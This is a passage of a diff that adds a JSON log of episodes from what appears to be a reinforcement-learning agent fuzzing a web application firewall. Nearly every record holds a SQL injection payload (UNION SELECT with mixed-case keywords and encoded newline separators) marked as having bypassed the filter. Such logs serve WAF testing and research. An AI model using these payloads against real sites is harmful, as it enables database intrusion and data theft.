+    "final_payload": "0'%0auNIon%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 271,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 272,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 273,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 274,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 275,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 276,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 277,
+    "steps": 12,
+    "total_reward": -18.24,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "formfeed",
+      "vtab",
+      "newline",
+      "newline",
+      "scientific",
+      "comment",
+      "formfeed",
+      "comment",
+      "between_space",
+      "comment",
+      "crlf",
+      "case_split"
+    ],
+    "final_payload": "0'%0cuNIon%0csELEct%0c1e0,2e0,'3"
+  },
+  {
+    "episode": 278,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 279,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 280,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 281,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 282,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 283,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 284,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 285,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0asElEcT%0a1,2,'3"
+  },
+  {
+    "episode": 286,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 287,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 288,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 289,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 290,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "url_encode",
+      "newline",
+      "comment",
+      "newline",
+      "comment",
+      "tab_space",
+      "comment",
+      "tab_space",
+      "newline",
+      "newline",
+      "tab_space",
+      "newline",
+      "comment",
+      "vtab",
+      "comment"
+    ],
+    "final_payload": "0'%0a%55NION%0a%53ELECT%0a1,2,'3"
+  },
+  {
+    "episode": 291,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 292,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 293,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0asELEct%0a1,2,'3"
+  },
+  {
+    "episode": 294,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUNIoN%0aselECT%0a1,2,'3"
+  },
+  {
+    "episode": 295,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aunION%0aSeLeCt%0a1,2,'3"
+  },
+  {
+    "episode": 296,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNIon%0aSELEcT%0a1,2,'3"
+  },
+  {
+    "episode": 297,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNiOn%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 298,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0aUnIoN%0aseLect%0a1,2,'3"
+  },
+  {
+    "episode": 299,
+    "steps": 15,
+    "total_reward": -39.6,
+    "success": false,
+    "final_result": "WAF_BLOCKED",
+    "sequence": [
+      "case_split",
+      "comment",
+      "case_split",
+      "newline",
+      "newline",
+      "tab_space",
+      "tab_space",
+      "crlf",
+      "comment",
+      "double_encode",
+      "comment",
+      "case",
+      "newline",
+      "newline",
+      "tab_space"
+    ],
+    "final_payload": "0'/**/UNIon/**/seLEct/**/1,2,'3"
+  },
+  {
+    "episode": 300,
+    "steps": 2,
+    "total_reward": 7.76,
+    "success": true,
+    "final_result": "SUCCESS",
+    "sequence": [
+      "case_split",
+      "newline"
+    ],
+    "final_payload": "0'%0auNion%0aselECT%0a1,2,'3"
+  }
+]
